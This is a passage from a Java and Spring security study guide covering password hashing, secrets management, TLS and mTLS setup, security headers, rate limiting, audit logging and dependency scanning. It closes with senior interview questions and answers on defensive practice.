## 7. Password Security

### Why Not MD5 or SHA?

MD5 and SHA-family hashes are **general-purpose hash functions** designed to be fast. This is exactly what you do NOT want for passwords — attackers can compute billions of MD5 hashes per second with modern GPUs.

**Password hashing functions** are intentionally slow and include a configurable **cost factor** that can be increased as hardware gets faster.

### Recommended Algorithms

| Algorithm | Mechanism | Memory-Hard | Notes |
|-----------|-----------|-------------|-------|
| **BCrypt** | Blowfish-based, 128-bit salt | No | Industry standard, well-tested. Default in Spring Security. |
| **SCrypt** | Sequential memory-hard | Yes | Resistant to GPU/ASIC attacks. Good for high-security needs. |
| **Argon2** | Winner of Password Hashing Competition (2015) | Yes | Best overall. Argon2id variant recommended (hybrid resistance). |

### How Salting Works

A **salt** is a random value unique to each password hash. It prevents:
- **Rainbow table attacks** — precomputed hash tables become useless
- **Identical password detection** — same password produces different hashes

```
password + "randomsalt123" -> BCrypt -> $2a$12$randomsalt123hashedresult...
password + "othersaltXYZ"  -> BCrypt -> $2a$12$othersaltXYZdifferentresult...
```

BCrypt, SCrypt, and Argon2 all generate and embed the salt automatically in the output string.

### Work Factor Tuning

The work factor (cost parameter) controls how much computation is needed per hash. It should be tuned so that hashing takes approximately **100ms-500ms** on your production hardware.

```
BCrypt cost factor: 2^cost iterations
  Cost 10: ~100ms (minimum recommended)
  Cost 12: ~300ms (good default)
  Cost 14: ~1200ms (high security)
```

### Spring Security PasswordEncoder

```java
@Configuration
public class PasswordConfig {

    // BCrypt — most common, cost factor 12
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }

    // Argon2 — strongest option
    @Bean
    public PasswordEncoder argon2Encoder() {
        return new Argon2PasswordEncoder(
            16,    // salt length
            32,    // hash length
            1,     // parallelism
            65536, // memory in KB (64MB)
            3      // iterations
        );
    }

    // Delegating encoder — supports multiple algorithms for migration
    @Bean
    public PasswordEncoder delegatingEncoder() {
        Map<String, PasswordEncoder> encoders = Map.of(
            "bcrypt", new BCryptPasswordEncoder(12),
            "argon2", new Argon2PasswordEncoder(16, 32, 1, 65536, 3),
            "scrypt", SCryptPasswordEncoder.defaultsForSpringSecurity_v5_8()
        );
        return new DelegatingPasswordEncoder("argon2", encoders);
    }
}
```

### BCrypt Usage Example

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordExample {

    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);

    public String hashPassword(String rawPassword) {
        // Generates salt automatically, includes it in output
        return encoder.encode(rawPassword);
        // Output: $2a$12$WApznUPhDubN0oeveSXHpOQJMCKZJuTsTpOI5JXRWO/mPCH3bEfSC
        //          ^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        //          cost       salt (22 chars)         hash (31 chars)
    }

    public boolean verifyPassword(String rawPassword, String storedHash) {
        // Extracts salt from stored hash, re-hashes, compares
        return encoder.matches(rawPassword, storedHash);
    }
}
```

---

## 8. Secrets Management

### Why Secrets Should Not Be in Code or Config Files

- Secrets in source code get committed to version control and are visible to everyone with repo access
- Config files (`application.properties`) are often deployed alongside the application and may be readable
- Secrets in Docker images persist in layer history even if removed later
- Once a secret is in git history, it is effectively public (even after removal from HEAD)

### HashiCorp Vault

Vault provides centralized secrets management with features like:
- **Dynamic secrets** — generates credentials on-demand (e.g., temporary database passwords) that are automatically revoked
- **Lease renewal** — secrets have a TTL and can be renewed or revoked
- **Encryption as a service** — transit engine encrypts/decrypts data without exposing keys
- **Audit logging** — every secret access is logged

```yaml
# Spring Cloud Vault integration — application.yml
spring:
  cloud:
    vault:
      uri: https://vault.example.com
      authentication: APPROLE
      app-role:
        role-id: ${VAULT_ROLE_ID}
        secret-id: ${VAULT_SECRET_ID}
      kv:
        backend: secret
        default-context: my-application
```

```java
// Secrets are injected as properties
@Value("${database.password}")
private String dbPassword; // Loaded from Vault, not application.properties
```

### AWS Secrets Manager / Parameter Store

| Feature | Secrets Manager | Parameter Store |
|---------|----------------|-----------------|
| Cost | ~$0.40/secret/month | Free tier available |
| Rotation | Built-in automatic rotation | Manual |
| Encryption | Always encrypted (KMS) | Optional encryption |
| Cross-account | Supported | Limited |
| Best for | Database creds, API keys | Configuration values, feature flags |

### Spring Cloud Config with Encryption

```yaml
# Encrypted values in config
spring:
  datasource:
    password: '{cipher}AQA1234encrypted5678...'

# Config server decrypts at serving time using a symmetric or asymmetric key
encrypt:
  key: ${ENCRYPT_KEY}  # Symmetric key from environment
```

### Environment Variables

Better than files in code but still imperfect:
- Visible in process listings (`/proc/<pid>/environ` on Linux)
- Inherited by child processes
- May be logged by accident in crash dumps or debugging output
- Cannot be rotated without restarting the process

### 12-Factor App Approach

The 12-factor methodology says: **store config in the environment**. While environment variables are the minimum bar, production systems should use a proper secrets manager:

1. **Development** — `.env` files (never committed, in `.gitignore`)
2. **CI/CD** — pipeline secrets (GitHub Actions secrets, GitLab CI variables)
3. **Production** — Vault, AWS Secrets Manager, or cloud-native solutions

---

## 9. HTTPS / TLS

### TLS Handshake (TLS 1.3 simplified)

```
Client                                Server
  |                                      |
  |  1. ClientHello                      |
  |     (supported cipher suites,        |
  |      key share, TLS version)         |
  |------------------------------------->|
  |                                      |
  |  2. ServerHello                      |
  |     (selected cipher suite,          |
  |      key share, certificate)         |
  |<-------------------------------------|
  |                                      |
  |  [Both derive session keys from      |
  |   key shares via ECDHE]              |
  |                                      |
  |  3. Client Finished (encrypted)      |
  |------------------------------------->|
  |                                      |
  |  4. Application Data (encrypted)     |
  |<------------------------------------>|
```

TLS 1.3 completes in **1 round trip** (1-RTT), compared to TLS 1.2 which required 2 round trips.

### Certificate Chains

```
Root CA (self-signed, trusted by OS/browser)
  +-- Intermediate CA (signed by Root)
       +-- Leaf Certificate (signed by Intermediate, your domain)
```

- **Root CAs** are pre-installed in OS/browser trust stores
- **Intermediate CAs** add a layer of security — if compromised, only the intermediate is revoked
- **Leaf certificates** are what your server presents; they must chain back to a trusted root

### Mutual TLS (mTLS)

Standard TLS only authenticates the server. **mTLS** also authenticates the client using a client certificate.

```
Use cases:
- Service-to-service communication in microservices
- Zero-trust networks
- API authentication (alternative to API keys)

How it works:
1. Server presents its certificate (standard TLS)
2. Server requests client certificate
3. Client presents its certificate
4. Server validates client certificate against trusted CA
5. Both parties are mutually authenticated
```

### Java Keystores and Truststores

| Store | Contains | Purpose |
|-------|----------|---------|
| **Keystore** | Private key + certificate | Server identity (what we present) |
| **Truststore** | Trusted CA certificates | Whom we trust (validate others) |

Common `keytool` commands:

```bash
# Generate a keystore with a self-signed certificate
keytool -genkeypair -alias myserver -keyalg RSA -keysize 2048 \
  -storetype PKCS12 -keystore keystore.p12 -validity 365 \
  -storepass changeit -dname "CN=localhost"

# Import a CA certificate into a truststore
keytool -importcert -alias myca -file ca-cert.pem \
  -keystore truststore.p12 -storetype PKCS12 -storepass changeit

# List contents of a keystore
keytool -list -keystore keystore.p12 -storetype PKCS12 -storepass changeit

# Export a certificate from a keystore
keytool -exportcert -alias myserver -keystore keystore.p12 \
  -storetype PKCS12 -storepass changeit -file server-cert.pem -rfc
```

### Certificate Pinning

**Pinning** means the client hardcodes the expected server certificate (or its public key hash) instead of relying on the CA trust chain.

- **When to use**: Mobile apps communicating with your own backend; high-security internal services
- **When NOT to use**: Public websites (breaks certificate rotation), third-party APIs
- **Risk**: If the pinned certificate rotates and the app is not updated, connections fail

### Configuring TLS in Spring Boot

`application.yml`:
```yaml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    key-alias: myserver

    # For mTLS — require client certificate
    client-auth: need  # 'need' = required, 'want' = optional
    trust-store: classpath:truststore.p12
    trust-store-password: ${TRUSTSTORE_PASSWORD}
    trust-store-type: PKCS12

    # Enforce TLS 1.2+
    protocol: TLS
    enabled-protocols: TLSv1.3, TLSv1.2
```

Redirect HTTP to HTTPS:

```java
@Configuration
public class HttpsRedirectConfig {

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint constraint = new SecurityConstraint();
                constraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                constraint.addCollection(collection);
                context.addConstraint(constraint);
            }
        };
        tomcat.addAdditionalTomcatConnectors(httpConnector());
        return tomcat;
    }

    private Connector httpConnector() {
        Connector connector = new Connector(
            TomcatServletWebServerFactory.DEFAULT_PROTOCOL);
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}
```

---

## 10. Security Headers and Best Practices

### Essential Security Headers

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers
            // Prevent MIME type sniffing
            .contentTypeOptions(Customizer.withDefaults()) // X-Content-Type-Options: nosniff

            // Prevent clickjacking
            .frameOptions(frame -> frame.deny()) // X-Frame-Options: DENY

            // Force HTTPS for 1 year, include subdomains
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)) // Strict-Transport-Security

            // Content Security Policy
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data:; " +
                    "font-src 'self'; " +
                    "frame-ancestors 'none'; " +
                    "base-uri 'self'; " +
                    "form-action 'self'"))

            // Referrer Policy
            .referrerPolicy(referrer ->
                referrer.policy(
                    ReferrerPolicyHeaderWriter.ReferrerPolicy
                        .STRICT_ORIGIN_WHEN_CROSS_ORIGIN))

            // Permissions Policy (formerly Feature-Policy)
            .permissionsPolicy(permissions ->
                permissions.policy("camera=(), microphone=(), geolocation=()"))
        )
        .build();
}
```

### Security Headers Summary

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'` | Prevents XSS by controlling resource loading |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS for all future requests |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME type sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevents clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer information leakage |
| `Permissions-Policy` | `camera=(), microphone=()` | Restricts browser feature access |
| `Cache-Control` | `no-store` | Prevents caching of sensitive responses |

### Rate Limiting and API Throttling

```java
// Using Bucket4j with Spring Boot
@Component
public class RateLimitFilter extends OncePerRequestFilter {

    // Simple in-memory rate limiter (use Redis for distributed systems)
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain)
            throws ServletException, IOException {

        String clientIp = request.getRemoteAddr();
        Bucket bucket = buckets.computeIfAbsent(clientIp, k ->
            Bucket.builder()
                .addLimit(Bandwidth.classic(100,
                    Refill.intervally(100, Duration.ofMinutes(1))))
                .build()
        );

        if (bucket.tryConsume(1)) {
            chain.doFilter(request, response);
        } else {
            response.setStatus(429);
            response.setHeader("Retry-After", "60");
            response.getWriter().write("{\"error\": \"Too many requests\"}");
        }
    }
}
```

### Security Logging and Audit Trails

```java
@Component
public class SecurityAuditLogger {

    private static final Logger auditLog =
        LoggerFactory.getLogger("SECURITY_AUDIT");

    @EventListener
    public void onAuthenticationSuccess(AuthenticationSuccessEvent event) {
        String username = event.getAuthentication().getName();
        auditLog.info("LOGIN_SUCCESS user={}", username);
    }

    @EventListener
    public void onAuthenticationFailure(AbstractAuthenticationFailureEvent event) {
        String username = event.getAuthentication().getName();
        String reason = event.getException().getMessage();
        auditLog.warn("LOGIN_FAILURE user={} reason={}", username, reason);
    }

    @EventListener
    public void onAccessDenied(AuthorizationDeniedEvent event) {
        Authentication auth = event.getAuthentication().get();
        auditLog.warn("ACCESS_DENIED user={} resource={}",
            auth.getName(), event.getSource());
    }
}
```

Key audit logging principles:
- **Log authentication events**: successful logins, failed logins, logouts, password changes
- **Log authorization failures**: access denied events
- **Log sensitive operations**: user creation/deletion, role changes, data exports
- **Never log secrets**: passwords, tokens, API keys, PII in plaintext
- **Use structured logging**: JSON format for easy parsing by SIEM tools
- **Set up alerts**: multiple failed logins, unusual access patterns, privilege escalation

### Dependency Scanning

Vulnerable dependencies are one of the most common attack vectors. Regularly scan and update:

| Tool | Type | Integration |
|------|------|-------------|
| **OWASP Dependency-Check** | Maven/Gradle plugin | Build pipeline, blocks on CVEs |
| **Snyk** | SaaS + CLI | GitHub integration, PR checks |
| **GitHub Dependabot** | Built into GitHub | Automatic PRs for updates |
| **Trivy** | Container scanner | Docker images, IaC |

```xml
<!-- Maven: OWASP Dependency-Check plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.9</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on High/Critical -->
    </configuration>
    <executions>
        <execution>
            <goals><goal>check</goal></goals>
        </execution>
    </executions>
</plugin>
```

---

## 11. Common Senior Interview Questions

**Q1: How would you design authentication and authorization for a microservices architecture?**

Use a centralized **authorization server** (Keycloak, Auth0) that issues JWTs. Each microservice acts as a **resource server** that validates tokens locally using the authorization server's public key (JWKS endpoint). For service-to-service calls, use the **Client Credentials** grant type. Propagate user context by forwarding the JWT or extracting claims and passing them in internal headers. Use an **API Gateway** as the single entry point that validates tokens and handles rate limiting. For fine-grained authorization, each service enforces its own permissions based on JWT claims (roles, scopes). Use **mTLS** between services for transport-level authentication in zero-trust environments.

**Q2: Explain the difference between stateful (session-based) and stateless (token-based) authentication. When would you use each?**

**Session-based**: Server creates a session object stored in memory or a session store (Redis). Client receives a session ID cookie. Server looks up the session on every request. Advantages: easy revocation (delete session), small cookie size. Disadvantages: server-side state, horizontal scaling requires shared session store (sticky sessions or Redis).

**Stateless (JWT)**: Server issues a signed token containing all necessary data. Client sends the token with each request. Server validates the signature without any lookup. Advantages: no server-side state, easy horizontal scaling, works across services. Disadvantages: hard to revoke (need blacklists), larger request size, cannot be invalidated before expiry without additional infrastructure.

Use session-based for traditional server-rendered web apps. Use JWT for APIs, microservices, SPAs, and mobile apps. Many production systems use a hybrid: short-lived JWTs for API access combined with server-side refresh token storage for revocation capability.

**Q3: A security audit found that your application is vulnerable to SQL injection. Walk me through how you would remediate this across the codebase.**

1. **Identify all database interactions**: search for raw SQL string construction, `Statement` usage (vs `PreparedStatement`), and JPQL/HQL string concatenation.
2. **Replace with parameterized queries**: use `PreparedStatement` with `?` placeholders for JDBC, named parameters with `@Param` for Spring Data JPA, and `CriteriaBuilder` for dynamic queries.
3. **Audit ORM usage**: even with JPA, native queries built with concatenation are vulnerable. Review all `@Query(nativeQuery=true)` annotations.
4. **Add static analysis**: integrate tools like SpotBugs with the FindSecBugs plugin or SonarQube to detect SQL injection patterns in CI/CD.
5. **Apply defense-in-depth**: use a WAF (Web Application Firewall) for an additional layer, apply least-privilege database permissions (read-only accounts for read operations), and implement input validation as a secondary defense (not primary -- parameterized queries are the real fix).
6. **Write tests**: create test cases that attempt SQL injection payloads and verify they are safely handled.

**Q4: How does CSRF protection work, and when can it be safely disabled?**

CSRF exploits the browser's automatic inclusion of cookies on cross-origin requests. Protection works by requiring a secret token (CSRF token) that the attacker's page cannot know. The server generates a token and embeds it in the form or provides it via a cookie. On form submission, the server validates that the token matches.

CSRF protection can be safely disabled when:
- The API uses **stateless authentication** (JWT in Authorization header, not cookies) -- if no cookies carry authentication, CSRF is not possible
- The API only accepts `Content-Type: application/json` -- browsers cannot send JSON via simple form submission (requires preflight, which is blocked by CORS)
- All cookies use `SameSite=Strict` or `SameSite=Lax` -- the browser itself prevents cross-origin cookie sending

It should NOT be disabled for traditional form-based web applications that use session cookies.

**Q5: How do you handle secret rotation in a production system without downtime?**

1. **Support multiple active secrets**: design the system to accept the current AND previous secret simultaneously during rotation. For JWT signing keys, publish both old and new public keys in the JWKS endpoint.
2. **Use a secrets manager with rotation**: HashiCorp Vault or AWS Secrets Manager can generate new credentials and update consumers automatically. Vault's dynamic secrets have TTLs and are auto-revoked.
3. **Staged rollout**: deploy the new secret, wait for all instances to pick it up (Spring Cloud Vault refreshes periodically), then deactivate the old secret.
4. **Database credential rotation**: use Vault's database secrets engine to generate short-lived credentials per application instance. When rotating, Vault creates new credentials and revokes old ones after a grace period.
5. **Monitor and alert**: log all secret access, alert on use of deprecated/old secrets, track rotation completion across all services.

**Q6: What is the OWASP Top 10, and how does each item apply to a Java/Spring application?**

The OWASP Top 10 (2021) lists the most critical web application security risks:

1. **Broken Access Control** -- Missing `@PreAuthorize`, IDOR vulnerabilities, missing ownership checks
2. **Cryptographic Failures** -- Weak hashing (MD5), plaintext secrets in config, missing HTTPS
3. **Injection** -- SQL injection, LDAP injection, OS command injection via `Runtime.exec()`
4. **Insecure Design** -- Missing rate limiting, no account lockout, business logic flaws
5. **Security Misconfiguration** -- Default credentials, verbose error messages, unnecessary features enabled, debug endpoints in production
6. **Vulnerable Components** -- Outdated libraries with known CVEs (Log4Shell was a prime example)
7. **Authentication Failures** -- Weak passwords, missing MFA, session fixation
8. **Software and Data Integrity Failures** -- Insecure deserialization, CI/CD pipeline tampering, unsigned updates
9. **Security Logging and Monitoring Failures** -- No audit logs, no alerting on breaches
10. **SSRF** -- Server-side code fetching user-supplied URLs without validation

**Q7: Explain how you would implement rate limiting for a distributed system.**

For distributed systems, local in-memory rate limiting is insufficient because requests are spread across multiple instances. Options:

1. **Token Bucket in Redis**: use a shared Redis store with atomic operations (Lua scripts or Redis modules like `redis-cell`). Libraries like Bucket4j support Redis as a backend. Each request checks/decrements the bucket atomically.
2. **Fixed Window Counter**: increment a Redis counter with key `rate:{clientId}:{minute}` and TTL. Simple but has burst issues at window boundaries.
3. **Sliding Window Log**: store timestamps of each request in a Redis sorted set. Count entries within the window. More accurate but more memory.
4. **API Gateway level**: Kong, AWS API Gateway, or Envoy provide built-in distributed rate limiting backed by Redis.

Key considerations: rate limit by user ID (authenticated), IP address (unauthenticated), and API key. Return `429 Too Many Requests` with `Retry-After` header. Use different limits for different endpoints (login stricter than read). Apply rate limiting before expensive operations (authentication, database queries).

**Q8: What is the difference between encryption at rest and encryption in transit? How do you implement both in a Java application?**

**Encryption in transit**: protects data as it moves between systems. Implemented via TLS/HTTPS. In Spring Boot, configure `server.ssl.*` properties. For service-to-service calls, use mTLS. For message queues, enable TLS on the broker connection.

**Encryption at rest**: protects stored data (databases, files, backups). Implemented at multiple levels:
- **Application level**: encrypt sensitive fields before storing (using AES-256-GCM via `javax.crypto.Cipher` or Vault's transit engine). Gives most control but adds complexity.
- **Database level**: Transparent Data Encryption (TDE) in PostgreSQL, MySQL. Encrypts data files on disk. No application changes needed.
- **Storage level**: encrypted EBS volumes, S3 server-side encryption (SSE-S3, SSE-KMS). Simplest, protects against physical theft.

Best practice is **defense in depth** -- apply encryption at multiple levels. Manage encryption keys separately from the encrypted data (use KMS, Vault).

**Q9: How would you prevent and detect a compromised JWT in production?**

Prevention:
- Use short-lived access tokens (5-15 minutes)
- Use HttpOnly, Secure, SameSite cookies for token storage
- Sign with strong keys (RS256 with 2048+ bit keys)
- Include `jti` claim for unique identification
- Bind tokens to client (include client fingerprint hash in claims)
- Always validate `iss`, `aud`, `exp`, and signature

Detection:
- Monitor for tokens used from unusual IP addresses or geolocations
- Track concurrent usage of same token from different IPs
- Implement refresh token rotation -- reuse detection triggers family revocation
- Log all authentication events and set up anomaly alerts
- Use token introspection for high-security endpoints

Response to compromise:
- Revoke all refresh tokens for the affected user
- Add the compromised token's `jti` to a blacklist (cached in Redis)
- Force re-authentication
- Rotate signing keys if the key itself is compromised (publish new JWKS, keep old key for validation during transition)

**Q10: How do you implement security in a CI/CD pipeline?**

1. **Secret management**: never store secrets in code or pipeline configs. Use pipeline-native secrets (GitHub Actions secrets, GitLab CI variables) injected as environment variables. For complex setups, fetch from Vault at build time.
2. **Static analysis (SAST)**: run SonarQube or Semgrep on every PR. Block merges on critical/high findings.
3. **Dependency scanning (SCA)**: run OWASP Dependency-Check or Snyk in the build. Fail the pipeline on known critical CVEs.
4. **Container scanning**: scan Docker images with Trivy or Grype before pushing to registry.
5. **Infrastructure as Code scanning**: scan Terraform/CloudFormation with Checkov or tfsec for misconfigurations.
6. **Signed artifacts**: sign build artifacts and container images. Verify signatures before deployment.
7. **Least privilege**: pipeline service accounts should have minimal permissions. Use OIDC federation instead of long-lived credentials where possible.
8. **Branch protection**: require PR reviews, status checks passing, and signed commits on main/release branches.
9. **Audit trail**: log all deployments, who triggered them, and what was deployed. Use immutable deployment artifacts.
